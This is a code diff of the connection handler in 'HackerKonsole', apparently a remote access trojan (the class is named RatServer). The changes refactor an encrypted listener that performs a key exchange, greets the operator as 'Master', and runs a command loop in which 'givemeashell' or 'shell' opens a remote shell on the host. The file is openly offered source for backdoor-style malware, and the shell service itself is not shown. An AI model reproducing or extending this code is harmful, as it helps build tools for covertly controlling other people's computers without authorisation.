@@ -12,100 +12,29 @@ namespace HackerKonsole.ServerCore
     /// </summary>
     public class ConnectionProcessor
     {
+        #region Public Fields
+
         public RatServer BaseServer;
-        public CryptTcpClient BaseSocket;
+        public CryptTcpClient CryptoSocket;
         public Dictionary<string, string> ConnectionHeaders;
-        public StreamReader InputStream;
-        public StreamWriter OutputStream;
+        public StreamReader UnencryptedInputStream;
+        public StreamWriter UnencryptedOutputStream;
         public int WaitTimeout;
+
+        #endregion Public Fields
+
+        #region Public Constructors
 
         public ConnectionProcessor(TcpClient s, RatServer srv, int waitTimeout)
         {
-            BaseSocket = new CryptTcpClient(s);
+            CryptoSocket = new CryptTcpClient(s);
             BaseServer = srv;
             WaitTimeout = waitTimeout;
         }
 
-        public void ProcessConnection()
-        {
-            var waiting = false;
-            // StreamWriter - easy processing for output
-            using (OutputStream = new StreamWriter(new BufferedStream(BaseSocket.GetStream())))
-            {
-                try
-                {
-                    Logger.WriteLine("Performing key exchange...");
-                    PerformSecureKeyExchange();
-                    Logger.WriteLine("Key exchange success! Client connected.");
-                    InputStream = new StreamReader(BaseSocket.GetStream());
-                    BaseSocket.SetReceiveTimeout(WaitTimeout);
-                    //Start actual session
-                    var rawConnHeaders = new List<string>();
-                    string recvData;
-                    //Wait for HK
-                    waiting = true;
-                    while (
-                        !(InputStream.ReadLine()).Trim()
-                            .Contains(CommonMessages.StartConnectionRequestIndication))
-                    {
-                    }
-                    SendLine(CommonMessages.BeginConnectionHelloBanner); //Send welcome banner
-                    //Get headers
-                    while ((recvData = InputStream.ReadLine())?.Trim() != "")
-                    {
-                        rawConnHeaders.Add(recvData);
-                    }
-                    recvData = null;
-                    ParseHeaders(rawConnHeaders.ToArray());
-                    if (ConnectionHeaders == null)
-                    {
-                        //Headers failed to parse
-                        throw new FormatException("Failed to parse headers because they were malformed.");
-                    }
-                    SendLine(CommonMessages.WelcomeMaster);
-                    //Interpreter mode
-                    while (true)
-                    {
-                        recvData = InputStream.ReadLine().Trim();
-                        ParseCommand(recvData);
-                    }
-                }
-                catch (NullReferenceException)
-                {
-                    Console.WriteLine("A network object was null. The client likely disconnected.");
-                }
-                catch (IOException)
-                {
-                    if (waiting)
-                    {
-                        Console.WriteLine("Connection timeout waiting for client.");
-                    }
-                }
-                catch (Exception ex)
-                {
-                    //The ultimate catch block to prevent crashes due to bad input
-                    Logger.WriteLine("Exception: {0}", ex);
-                }
-                finally
-                {
-                    InputStream = null;
-                    OutputStream = null;
-                }
-            }
-            BaseSocket.Close();
-        }
+        #endregion Public Constructors
 
-        public void SendLine(string line)
-        {
-            OutputStream.WriteLine(line);
-            OutputStream.Flush();
-        }
-
-        public void PerformSecureKeyExchange()
-        {
-            BaseSocket.GenerateAsymmetricKeys();
-            BaseSocket.ServerPerformKeyExchange();
-        }
+        #region Public Methods
 
         public void ParseHeaders(string[] rawHeaders)
         {
@@ -142,6 +71,91 @@ namespace HackerKonsole.ServerCore
             }
         }
 
+        public void PerformSecureKeyExchange()
+        {
+            CryptoSocket.GenerateAsymmetricKeys();
+            CryptoSocket.ServerPerformKeyExchange();
+        }
+
+        public void ProcessConnection()
+        {
+            var waiting = false;
+            // StreamWriter - easy processing for output
+            using (UnencryptedOutputStream = new StreamWriter(new BufferedStream(CryptoSocket.GetUnencryptedStream())))
+            {
+                try
+                {
+                    Logger.WriteLine("Performing key exchange...");
+                    PerformSecureKeyExchange();
+                    Logger.WriteLine("Key exchange success! Client connected.");
+                    UnencryptedInputStream = new StreamReader(CryptoSocket.GetUnencryptedStream());
+                    CryptoSocket.SetReceiveTimeout(WaitTimeout);
+                    //Start actual session
+                    var rawConnHeaders = new List<string>();
+                    string recvData;
+                    //Wait for HK
+                    waiting = true;
+
+                    while (
+                        !(CryptoSocket.ReadLineCrypto()).Trim()
+                            .Contains(CommonMessages.StartConnectionRequestIndication))
+                    {
+                    }
+                    SendLine(CommonMessages.BeginConnectionHelloBanner); //Send welcome banner
+                    //Get headers
+                    while ((recvData = CryptoSocket.ReadLineCrypto())?.Trim() != "")
+                    {
+                        rawConnHeaders.Add(recvData);
+                    }
+                    recvData = null;
+                    ParseHeaders(rawConnHeaders.ToArray());
+                    if (ConnectionHeaders == null)
+                    {
+                        //Headers failed to parse
+                        throw new FormatException("Failed to parse headers because they were malformed.");
+                    }
+                    SendLine(CommonMessages.WelcomeMaster);
+                    //Interpreter mode
+                    while (true)
+                    {
+                        recvData = CryptoSocket.ReadLineCrypto().Trim();
+                        ParseCommand(recvData);
+                    }
+                }
+                catch (NullReferenceException)
+                {
+                    Console.WriteLine("A network object was null. The client likely disconnected.");
+                }
+                catch (IOException)
+                {
+                    if (waiting)
+                    {
+                        Console.WriteLine("Connection timeout waiting for client.");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    //The ultimate catch block to prevent crashes due to bad input
+                    Logger.WriteLine("Exception: {0}", ex);
+                }
+                finally
+                {
+                    UnencryptedInputStream = null;
+                    UnencryptedOutputStream = null;
+                }
+            }
+            CryptoSocket.Close();
+        }
+
+        public void SendLine(string line)
+        {
+            CryptoSocket.WriteLineCrypto(line);
+        }
+
+        #endregion Public Methods
+
+        #region Private Methods
+
         private void ParseCommand(string command)
         {
             switch (command)
@@ -155,14 +169,17 @@ namespace HackerKonsole.ServerCore
                 case "givemeashell":
                 case "shell":
                     SendLine("Opening Shell...");
-                    HKServices.RemoteShell(OutputStream, InputStream, SendLine);
+                    HKServices.RemoteShell(CryptoSocket, SendLine);
                     SendLine("Shell session closed.");
                     break;
+
                 case "help":
                 case "helpme":
                     SendLine("You don't need help, you're a h4x0r!");
                     break;
             }
         }
+
+        #endregion Private Methods
     }
 }
